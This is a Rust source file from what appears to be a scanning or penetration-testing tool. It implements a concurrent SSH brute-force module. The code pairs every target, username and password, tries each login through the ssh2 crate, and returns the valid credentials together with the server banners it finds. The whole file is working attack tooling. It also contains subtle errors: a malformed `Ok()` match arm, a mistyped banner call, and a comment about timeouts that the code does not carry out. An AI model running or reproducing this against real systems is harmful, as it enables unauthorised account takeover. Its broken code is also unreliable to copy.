// src/brute/ssh.rs
use std::net::IpAddr;
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time::timeout;
use log::{debug, info, error};
use ssh2::Session;
use crate::common::utils;
use crate::scanner::ServiceInfo;
use crate::brute::BruteResult;

pub async fn brute_force(
    services: &[&ServiceInfo],
    usernames: &[String],
    passwords: &[String],
    timeout_secs: u64,
    threads: usize,
) -> Result<Vec<BruteResult>, Box<dyn std::error::Error>> {
    if services.is_empty() || usernames.is_empty() || passwords.is_empty() {
        return Ok(Vec::new());
    }
    
    info!("Starting SSH brute force for {} services with {} usernames and {} passwords...", 
        services.len(), usernames.len(), passwords.len());
    
    // 计算总尝试次数
    let total_attempts = services.len() * usernames.len() * passwords.len();
    let pb = utils::create_progress_bar(total_attempts as u64, "SSH brute force");
    
    let (tx, mut rx) = mpsc::channel(threads);
    let timeout_duration = Duration::from_secs(timeout_secs);
    
    // 创建所有组合的任务
    let mut tasks = Vec::new();
    for service in services {
        for username in usernames {
            for password in passwords {
                tasks.push((
                    service.ip,
                    service.port,
                    username.clone(),
                    password.clone(),
                ));
            }
        }
    }
    
    // 分块处理
    let chunk_size = (tasks.len() + threads - 1) / threads;
    let chunks: Vec<Vec<(IpAddr, u16, String, String)>> = tasks
        .chunks(chunk_size)
        .map(|chunk| chunk.to_vec())
        .collect();
    
    for chunk in chunks {
        let tx = tx.clone();
        let timeout_duration = timeout_duration;
        let pb = pb.clone();
        
        tokio::spawn(async move {
            for (ip, port, username, password) in chunk {
                if let Some(result) = try_ssh_login(
                    ip,
                    port,
                    &username,
                    &password,
                    timeout_duration
                ).await {
                    let _ = tx.send(result).await;
                }
                pb.inc(1);
            }
        });
    }
    
    // 丢弃原始发送者
    drop(tx);
    
    // 收集结果
    let mut results = Vec::new();
    while let Some(result) = rx.recv().await {
        results.push(result);
    }
    
    pb.finish_with_message(format!("Found {} valid SSH credentials", results.len()));
    
    Ok(results)
}

async fn try_ssh_login(
    ip: IpAddr,
    port: u16,
    username: &str,
    password: &str,
    timeout_duration: Duration,
) -> Option<BruteResult> {
    // 使用spawn_blocking执行阻塞的SSH操作
    let ip_str = ip.to_string();
    let username_str = username.to_string();
    let password_str = password.to_string();
    
    let result = tokio::task::spawn_blocking(move || {
        // 创建TCP连接
        let tcp = std::net::TcpStream::connect(format!("{}:{}", ip_str, port));
        if let Err(_) = tcp {
            return None;
        }
        
        let mut session = Session::new().unwrap();
        session.set_tcp_stream(tcp.unwrap());
        
        // 禁用阻塞握手过程中的超时功能
        // 但实际上这个操作仍然可能阻塞很长时间
        if let Err(_) = session.handshake() {
            return None;
        }
        
        // 尝试登录
        match session.userauth_password(&username_str, &password_str) {
            Ok() => {
                // 登录成功
                let mut details = None;
                
                // 尝试获取SSH版本信息
                if let Ok(banner) = session.banner() {
                    details = Some(banner.to_string());
                }
                
                Some(BruteResult {
                    ip: ip_str.parse().unwrap(),
                    port,
                    service: "ssh".to_string(),
                    username: username_str,
                    password: password_str,
                    details,
                })
            },
            Err(_) => None,
        }
    });
    
    // 添加超时保护
    match timeout(timeout_duration, result).await {
        Ok(Ok(Some(result))) => Some(result),
        _ => None,
    }
}
